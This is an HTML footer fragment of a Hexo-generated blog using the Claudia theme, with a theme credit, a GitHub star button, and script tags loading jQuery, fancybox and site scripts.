Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>